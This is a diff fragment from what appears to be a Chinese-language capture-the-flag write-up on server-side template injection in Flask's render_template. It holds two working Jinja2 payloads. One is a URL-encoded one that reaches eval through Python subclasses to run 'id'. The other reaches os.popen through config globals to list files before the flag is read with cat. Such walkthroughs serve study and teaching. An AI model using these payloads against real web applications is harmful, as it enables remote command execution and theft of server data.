@@ -45,4 +45,12 @@ render_template渲染函数的问题
  http://192.168.1.10:8000/?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20}}%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
 ```
 
+2.传入参数
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}查看文件列表
+![image](https://user-images.githubusercontent.com/24989246/179968951-d2fd0317-cedf-442c-b687-2a3bb2829d90.png)
+
+再cat 一下
+![image](https://user-images.githubusercontent.com/24989246/179969046-f6556bc1-1a78-40a4-8818-aa4d63d371b2.png)
+
+得到flag
 
